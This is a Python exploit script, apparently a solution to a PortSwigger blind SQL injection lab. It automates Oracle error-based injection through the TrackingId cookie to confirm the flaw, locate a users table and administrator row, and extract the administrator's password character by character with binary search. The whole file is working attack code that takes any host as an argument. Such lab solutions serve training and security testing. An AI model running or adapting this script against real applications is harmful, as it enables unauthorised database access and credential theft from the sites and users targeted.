# lab link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import urllib3
import requests
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={
  'http': '127.0.0.1:8080',
  'https': '127.0.0.1:8080'
}

client = None
tracking_cookie = None
host = None

def send_request(payload):
  # Set the cookie with the injection payload
  client.cookies.set('TrackingId', f'{tracking_cookie}{payload}', domain=f'{host[8:]}')

  # Make the actual request
  response = client.get(f'{host}')

  # The indication of a successful payload is an Internal Server Error (500)
  if response.status_code == 500:
    return True
  return False

def retreive_tracking_cookie():
  global tracking_cookie
  response = client.get(f'{host}')

  # extract the cookie value from the HTTP response
  tracking_cookie = response.cookies.get('TrackingId')
  if tracking_cookie:
    print(f'(+) Tracking cookie found: {tracking_cookie}')
  else:
    print(f'(+) Tracking cookie not found!')
    sys.exit(-1)

def confirm_injection():
  # Must return an error
  if not send_request("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"):
    print('(-) Invalid Payload')
    sys.exit(-1)
  print('(+) Injection Confirmed')

  # Must not return an error
  if send_request("'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"):
    # if it does
    print('(-) Invalid Payload')
    sys.exit(-1)
  print('(+) Injection Confirmed')
  
  # Checking the presence of users table: must return an error
  if not send_request("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM = 1)||'"):
    print('(-) users table not found!')
    sys.exit(-1)
  print('(+) users table found.')
  
  # Checking the presence of username 'administrator': must return an error
  if not send_request("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
    print('(-) username:administrator not found!')
    sys.exit(-1)
  print('(+) username:administrator found!')

def get_password_length():
  # Retreive the password length using binary search to reduce the number of requests made
  pass_length = [x for x in range(1, 100)]
  lb = 0
  ub = len(pass_length)

  while lb <= ub:
    mid = (lb+ub)//2

    if send_request(f"'||(SELECT CASE WHEN (LENGTH(password)={mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
      return mid

    elif send_request(f"'||(SELECT CASE WHEN (LENGTH(password)>{mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
      lb = mid+1

    else:
      ub = mid-1

  print('(-) Can not determine password length!')
  sys.exit(-1)

def retreive_admin_password(password_length):
  password = ''

  # ASCII positions for "lowercase alphanumeric" characters
  ascii_positions = [x for x in range(48, 58)] + [x for x in range(97, 123)]

  # Total requests to be made
  total_combinations = len(ascii_positions)*password_length
  print(f'(+) Starting password enumeration \nTotal requests to be sent: {total_combinations}')

  sys.stdout.write('\r[+] Current Extraction Status: ')
  sys.stdout.flush()

  req_count = 0
  for i in range(1, password_length+1):
    lb = 0
    ub = len(ascii_positions)-1

    while lb <= ub:
      req_count += 1
      
      mid_index = (lb+ub)//2
      mid_value = chr(ascii_positions[mid_index])

      if send_request(f"'||(SELECT CASE WHEN (SUBSTR(password, {i}, 1)='{mid_value}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
        password += mid_value
        break
      
      elif send_request(f"'||(SELECT CASE WHEN (SUBSTR(password, {i}, 1)>'{mid_value}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"):
        lb = mid_index+1

      else:
        ub = mid_index-1

    sys.stdout.write('\r[+] Current extraction status: ' + password)
    sys.stdout.flush()

    if len(password) == password_length:
      print(f'\nTotal requests made: {req_count}')
      return password
  
  print('Failed!')
  sys.exit(-1)

if __name__ == '__main__':
  try:
    host = sys.argv[1].strip().rstrip('/')

  except IndexError:
    print(f'(+) Usage: {sys.argv[0]} <HOST>')
    print(f'(+) Example: {sys.argv[0]} http://www.example.com')
    sys.exit(-1)

  with requests.Session() as client:
    client.verify = False
    client.proxies = proxies
    
    retreive_tracking_cookie()
    confirm_injection()

    password_length = get_password_length()
    print(f'[+] Found password length: {password_length}')

    admin_password = retreive_admin_password(password_length)
    print(f'[+] Found administrator password: {admin_password}')